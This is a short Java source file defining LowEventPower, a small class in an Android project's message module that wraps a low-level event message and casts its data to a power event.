package com.android.dvci.module.message;

/**
 * Created by zad on 15/06/15.
 */

import com.android.dvci.event.LowEvent.PowerEvent;
import com.android.dvci.util.LowEventMsg;

/**
 * Created by zad on 05/06/15.
 */
public class LowEventPower {
	private static final String TAG = "LowEventAudio"; //$NON-NLS-1$
	public LowEventMsg event;
	public PowerEvent power_data;

	public LowEventPower(LowEventMsg event) {
		this.event = event;
		this.power_data = (PowerEvent) event.data;
	}

}

